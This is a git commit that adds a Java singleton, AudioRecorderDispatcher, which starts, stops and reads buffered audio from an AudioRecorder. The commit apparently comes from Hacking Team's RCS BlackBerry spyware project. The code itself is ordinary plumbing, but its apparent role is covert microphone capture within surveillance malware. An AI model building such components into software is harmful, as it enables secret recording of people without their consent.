6a40c3267aed0e081453488dd0e59ac0a0fb152e
Fabrizio Cornelli <f.cornelli@hackingteam.it>
2010-06-28 07:13:26 +0000

    Audio Recorder Dispatcher : singleton, resource dispatcher Sync and data pipe by PipeStreams.
    git-svn-id: http://rcs-dev/svn/rcs/RCSBlackBerry/Workspace_5/trunk@2573 30e694c7-159d-4bd8-ba75-215c342f8d20

---
+++ RCSBlackBerry/src/blackberry/record/AudioRecorderDispatcher.java
@@ -0,0 +1,52 @@
+package blackberry.record;
+
+import blackberry.interfaces.Singleton;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
+
+public class AudioRecorderDispatcher implements Singleton{
+    //#ifdef DEBUG
+    private static Debug debug = new Debug("AudioRecDisp", DebugLevel.VERBOSE);
+    //#endif
+    private static AudioRecorderDispatcher instance;
+    private static AudioRecorder recorder;
+    
+    public synchronized static AudioRecorderDispatcher getInstance()
+    {
+        if(instance == null){
+            instance = new AudioRecorderDispatcher();
+        }
+        return instance;
+    }
+    
+    private AudioRecorderDispatcher(){
+        
+    }
+    
+    public synchronized void start(){
+        if(recorder!=null && recorder.isStarted()){
+            //#ifdef DEBUG_ERROR
+            debug.error("not stopped recorder");
+            //#endif
+            return;
+        }
+     
+        recorder = new AudioRecorder();
+        recorder.start();
+    }
+    
+    public synchronized void stop(){
+        if(recorder==null || !recorder.isStarted()){
+            //#ifdef DEBUG_ERROR
+            debug.error("stopped recorder");
+            //#endif
+            return;
+        }
+        
+        recorder.stop();
+    }
+    
+    public synchronized byte[] getAvailable(){
+        return recorder.getAvailable();
+    }    
+}
